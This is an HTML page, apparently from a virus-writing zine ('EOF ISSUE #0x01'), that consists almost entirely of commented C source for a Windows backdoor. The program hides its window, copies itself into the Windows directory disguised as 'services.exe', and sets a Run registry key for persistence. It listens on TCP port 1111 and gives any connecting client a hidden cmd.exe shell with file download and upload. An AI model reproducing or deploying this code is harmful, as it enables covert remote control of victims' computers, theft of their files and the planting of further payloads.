@@ -1,0 +1,389 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: Nibble/EOF || <a style="text-decoration: none" href="../mainmenu/sources.htm"><span style="text-decoration: none">Back to sources</span></a> || <a style="text-decoration: none" target="_blank" href="../binsrc/Nibble/Small/Server"><span style="text-decoration: none; color: #BFBF88">View project folder</span></a> || <hr></pre>
+<pre>
+//includes
+#include &lt;windows.h&gt;
+#include &lt;winsock.h&gt;
+#include &lt;wininet.h&gt;
+#include &lt;small.h&gt;
+
+#include &quot;..\\Includes\\Includes.h&quot;
+#include &quot;..\\Includes\\Small.h&quot;
+
+//consts
+#define PORT 1111
+#define SLEEP_TIME 500
+#define szExit &quot;exit\r\n&quot;
+#define szError &quot;Some shit happend&quot;
+
+#define szRegshit &quot;666&quot;
+#define szName    &quot;\\services.exe&quot;
+
+#define szMtx   &quot;-. .-&quot;
+//              |  €  |
+//               \___/
+
+//main function
+int main()
+{
+ WSADATA wsa;
+ struct sockaddr_in sin;
+ struct sockaddr_in sa = {0};
+
+ char szbuff[MAX_BUFF];
+ char szFile[MAX_PATH];
+
+ int a_sock,sock;
+
+ SECURITY_ATTRIBUTES sec_att;
+ STARTUPINFO startup_info;
+ HANDLE hReadPip1,hReadPip2;
+ HANDLE hWritePip1,hWritePip2;
+ HKEY hKey;
+
+ unsigned long dwBytesR;
+ unsigned long ulWrite;
+
+ unsigned int uSize;
+ unsigned int uSend;
+ unsigned int uMove;
+ unsigned int uMode;
+ unsigned int uByteS;
+
+ int rsize;
+
+ HANDLE hFile;
+
+ //Hide Console window | CreateMutex because we only need one our running
+ //process | Copy itself to win dir | Autorun shit |
+
+  ShowWindow(FindWindow(&quot;ConsoleWindowClass&quot;,0),0);
+
+  CreateMutex(0,FALSE, szMtx);
+
+  if(GetLastError() == ERROR_ALREADY_EXISTS)
+  {
+   ExitProcess(0);
+  }
+
+  GetWindowsDirectory(szbuff,sizeof(szbuff));
+  lstrcat(szbuff,szName);
+
+  GetModuleFileName(GetModuleHandle(0),szFile,sizeof(szFile));
+  
+  if(RegCreateKey(HKEY_CURRENT_USER,&quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;,&amp;hKey) == ERROR_SUCCESS)
+  {
+   RegSetValueEx(hKey,szRegshit,0,REG_SZ,szbuff,sizeof(szbuff));
+   RegCloseKey(hKey);
+  }
+
+  if(lstrcmp(szbuff,szFile))
+  {
+   CopyFile(szFile,szbuff,FALSE);
+   ShellExecute(0, &quot;open&quot;,szbuff,0,0,SW_HIDE);
+   ExitProcess(0);
+  }
+
+ //Initialize winsock library
+  WSAStartup(0x101,&amp;wsa);
+
+  //Create socket
+  a_sock = socket(AF_INET,SOCK_STREAM,0);
+
+  //If cant create socket exit
+  if(a_sock == 0)
+  {
+   return -1;
+  }
+
+  //fill structure 
+  sin.sin_family = AF_INET; //TCP
+  sin.sin_addr.s_addr = INADDR_ANY; //Accept any ip
+  sin.sin_port = htons(PORT); //listen on this port
+
+  //try to bind socket to port | error -&gt; exit
+  if(bind(a_sock,(SOCKADDR *)&amp;sin,sizeof(sin)) != 0)
+  {
+   return -1;
+  }
+
+  //listen and accept only one connection | error -&gt; exit
+  if(listen(a_sock,1) != 0)
+  {
+   return -1;
+  }
+
+  //Loop forever
+  while(1)
+  {
+   //Accept incoming connection
+   sock = accept(a_sock,0,0);
+   
+   //error -&gt; loop again
+   if(sock == INVALID_SOCKET)continue;
+
+   //fill structure
+   sec_att.lpSecurityDescriptor = 0; // default security descriptor
+   sec_att.bInheritHandle = TRUE; 
+   sec_att.nLength = sizeof(SECURITY_ATTRIBUTES); // sizeof(SECURITY_ATTRIBUTES) struct
+
+   //create the pipes for our command promp
+   CreatePipe(&amp;hReadPip1,&amp;hWritePip1,&amp;sec_att,0);
+   CreatePipe(&amp;hReadPip2,&amp;hWritePip2,&amp;sec_att,0);
+
+   //The GetStartupInfo function retrieves the contents of the 
+   //STARTUPINFO structure that was specified when the calling 
+   //process was created.(MSDN)
+   GetStartupInfo(&amp;startup_info);
+
+   //fill structure
+   startup_info.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; //standard input/output
+   startup_info.wShowWindow = SW_HIDE; //hide window
+   startup_info.hStdOutput = startup_info.hStdError = hWritePip1; //hWritePip1 is handle for output
+   startup_info.hStdInput = hReadPip2; //and hReadPip2 is handle for input
+
+   //run cmd
+   CreateProcess(0,&quot;cmd.exe&quot;,0,0,TRUE,CREATE_NEW_CONSOLE,0,0,&amp;startup_info,(PROCESS_INFORMATION*)&amp;startup_info);
+
+   //Loop forever again :)
+
+   while(1)
+   {
+	Sleep(SLEEP_TIME); //Sleep
+
+    //Check do we have something ?
+    if(PeekNamedPipe(hReadPip1,&amp;szbuff[1],MAX_BUFF,&amp;dwBytesR,0,0) == 0)
+	{
+	 break;
+	}
+
+	if(dwBytesR) 
+    {
+	 //First char means something (download,upload,standard command)
+
+	 szbuff[0] = DEFAULT_MARK;
+
+     //read data from cmd.exe
+     if(ReadFile(hReadPip1,&amp;szbuff[1],dwBytesR,&amp;dwBytesR,0) == 0)
+	 {
+	  break;
+	 }
+     
+	 //send it to client
+     if(send(sock,szbuff,dwBytesR+1,0) &lt;= 0)
+	 {
+	  break;
+	 }
+
+	 dwBytesR = 0;
+    }
+    else
+    {
+	 //clear buff
+ 	 ZeroMemory(szbuff,MAX_BUFF);
+
+	 //recive buffer
+     dwBytesR=rsize=recv(sock,szbuff,MAX_BUFF-1,0);
+
+	 //if some error happens break this loop
+	 if(rsize &lt;= 0)
+	 {
+	  break;
+	 }
+   
+	 //does client send &quot;exit&quot; string
+	 if(strncmp(&amp;szbuff[1],szExit,lstrlen(szExit)) == 0)
+	 {
+	  break;
+	 }
+   
+	 //add END_MARK on szbuff
+	 lstrcat(szbuff,END_MARK);
+
+	 //Check what client sends
+	 switch(szbuff[0])
+	 {
+	 case DEFAULT_MARK:
+		  //This means simple command
+		  //Write it to cmd.exe
+		  WriteFile(hWritePip2,&amp;szbuff[1],dwBytesR,&amp;dwBytesR,0);
+		  break;
+
+	 case DOWNLOAD_MARK:
+          //Client wants to download something
+
+		  //Remove END_MARK
+		  szbuff[lstrlen(szbuff)-4] = '\0';
+		  
+		  //Open file for reading
+		  hFile = CreateFile(&amp;szbuff[lstrlen(DOWNLOAD)+2],GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
+		  
+		  //Can't open file
+		  if(hFile == INVALID_HANDLE_VALUE)
+		  {
+		   //send(sock,szError,lstrlen(szError),0);
+		   break;
+		  }
+
+		  //Get File size
+		  uSize = GetFileSize(hFile,0);
+
+		  //put that size into szbuff with specific mark at the beggining
+		  wsprintf(szbuff,&quot;%c%d&quot;,FILESIZE_MARK,uSize);
+
+		  //send it to client
+		  uByteS = send(sock,szbuff,lstrlen(szbuff),0);
+
+		  //error -&gt; break loop
+		  if(uByteS &lt;= 0)
+		  {
+		   break;
+		  }
+
+		  //put in szbuff download_mark char because client will know
+		  //that is server sending file
+
+		  szbuff[0] = DOWNLOAD_MARK;
+
+		  //loop while uSize is positive number
+		  while(uSize)
+		  {
+		   //Zero szbuff exept first char(DOWNLOAD_MARK)
+		   ZeroMemory(&amp;szbuff[1],MAX_BUFF-1);
+
+		   uSend = MAX_BUFF-2;
+
+		   //Do I need explain this ? blah
+		   if(uSend&gt;uSize)
+		   {
+		    uSend=uSize;
+		   } 
+
+		   //If uSize is smaller or equal to ZERO break
+		   if((int)uSize &lt;= 0)
+		   {
+		    break;
+		   }
+
+		   //uMove is holding position in file
+		   uMove = 0-uSize;
+
+		   //set position to uMove in file from end file
+		   SetFilePointer(hFile,uMove,0,FILE_END);
+
+		   //read that part from file and put it into szbuff
+		   ReadFile(hFile,&amp;szbuff[1],uSend,&amp;uMode,0);
+
+		   //send it to client
+		   uByteS = send(sock,szbuff,uSend+1,0);
+
+		   //error -&gt; break
+		   if(uByteS == SOCKET_ERROR)
+		   {
+		    break;
+		   }
+
+		   //Substract sended bytes from uSize
+		   uSize = uSize - uSend;
+
+		  }
+       
+		  //Close handle
+		  CloseHandle(hFile);
+
+		  break;
+
+	 case UPLOAD_MARK:
+          //Uploading file
+
+		  //Open file for writing
+		  hFile = CreateFile(szFile,GENERIC_WRITE,0,0,OPEN_ALWAYS,0,0);
+
+		  //Can't create file
+		  if(hFile == INVALID_HANDLE_VALUE) 
+		  {
+		   //send(sock,szError,lstrlen(szError),0);
+		   break;
+		  }
+
+		  //While client doesn't send ENDF_MARK
+		  while(szbuff[0] != ENDF_MARK)
+		  {
+		   //Set the pointer at end of file
+		   SetFilePointer(hFile,0,0,FILE_END);
+
+		   //Write szbuff to file
+		   WriteFile(hFile,&amp;szbuff[1],rsize-1,&amp;ulWrite,0);
+
+		   //Zero szbuff
+		   ZeroMemory(szbuff,MAX_BUFF);
+          
+		   //receive buffer
+           rsize=recv(sock,szbuff,MAX_BUFF-1,0);
+
+		   //error break
+		   if(rsize &lt;= 0)
+		   {
+			break;
+		   }
+		  }
+
+		  //Close Handle
+		  CloseHandle(hFile);
+
+	      break;
+
+	 case FILESIZE_MARK:
+		  //Convert file size into number
+		  uSize = atoi(&amp;szbuff[1]);
+		  break;
+
+	 case FILENAME_MARK:
+          //get File name that client sends
+
+		  //remove last 4 bytes
+		  szbuff[lstrlen(szbuff)-4] = '\0';
+
+		  //copy it to szFile
+		  lstrcpy(szFile,&amp;szbuff[1]);
+
+		  //put upload mark into szbuff
+		  szbuff[0] = UPLOAD_MARK;
+		  szbuff[1] = '\0';
+
+		  //send it to client
+		  send(sock,szbuff,lstrlen(szbuff),0);
+
+	      break;
+	 }
+    }
+   }
+
+   //write &quot;exit&quot; command to cmd.exe
+   WriteFile(hWritePip2,szExit,lstrlen(szExit),&amp;dwBytesR,0);
+
+   //Close handles
+   CloseHandle(hWritePip2);
+   CloseHandle(hReadPip1);
+   CloseHandle(hWritePip1);
+   CloseHandle(hReadPip2);
+
+   //Close socket
+   closesocket(sock);
+
+  }
+  //Close socket
+  closesocket(a_sock);
+  closesocket(sock);
+  WSACleanup();
+  //Exit
+ return 0;
+}
+
+//----------------LIBS----------------+
+#pragma comment(lib,&quot;wsock32.lib&quot;)
+#pragma comment(lib,&quot;wininet.lib&quot;)
+</pre></body></html>
